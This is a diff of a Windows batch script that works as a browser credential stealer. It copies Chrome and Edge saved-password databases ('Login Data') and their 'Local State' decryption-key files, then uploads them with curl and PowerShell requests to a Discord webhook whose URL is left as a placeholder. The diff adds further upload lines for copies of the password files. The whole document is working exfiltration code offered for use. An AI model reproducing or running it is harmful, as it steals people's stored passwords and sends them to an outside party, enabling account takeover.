@@ -28,7 +28,7 @@ copy "C:\Users\%USERNAME%\AppData\Local\Microsoft\Edge\User Data\Default\Login D
 C:\Users\%USERNAME%\AppData\Local\Microsoft\Edge\User Data\Default\Login Data
 
 
-set "webhook_url=YOUR_DISCORD_WEBHOOK_URL"
+set "webhook_url=YOUR_DISCORD_WEBHOOK"
 
 powershell -Command "(Invoke-WebRequest -Uri '%webhook_url%' -Method Post -Body (@{content='----------------------------------------------------------------------------------------------------------------------------------------------------------------------'} | ConvertTo-Json) -ContentType 'application/json').StatusCode"
  
@@ -37,11 +37,15 @@ powershell -Command "(Invoke-WebRequest -Uri '%webhook_url%' -Method Post -Body 
 
 curl -X POST -H "Content-Type: multipart/form-data" -F "file=@C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\Login Data" "%webhook_url%"
 
+curl -X POST -H "Content-Type: multipart/form-data" -F "file=@C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\Login_Data" "%webhook_url%"
+
 curl -X POST -H "Content-Type: multipart/form-data" -F "file=@C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Local State" "%webhook_url%"
 
 powershell -Command "(Invoke-WebRequest -Uri '%webhook_url%' -Method Post -Body (@{content='Edge Browser Info'} | ConvertTo-Json) -ContentType 'application/json').StatusCode"
 
 curl -X POST -H "Content-Type: multipart/form-data" -F "file=@C:\Users\%USERNAME%\AppData\Local\Microsoft\Edge\User Data\Default\Login Data" "%webhook_url%"
+
+curl -X POST -H "Content-Type: multipart/form-data" -F "file=@C:\Users\%USERNAME%\AppData\Local\Microsoft\Edge\User Data\Default\Login_Data" "%webhook_url%"
 
 curl -X POST -H "Content-Type: multipart/form-data" -F "file=@C:\Users\%USERNAME%\AppData\Local\Microsoft\Edge\User Data\Local State" "%webhook_url%"
 
@@ -77,9 +81,6 @@ powershell -Command "(Invoke-WebRequest -Uri '%webhook_url%' -Method Post -Body 
 
 
 powershell -Command "(Invoke-WebRequest -Uri '%webhook_url%' -Method Post -Body (@{content='----------------------------------------------------------------------------------------------------------------------------------------------------------------------'} | ConvertTo-Json) -ContentType 'application/json').StatusCode"
-
-
-
 
 
 
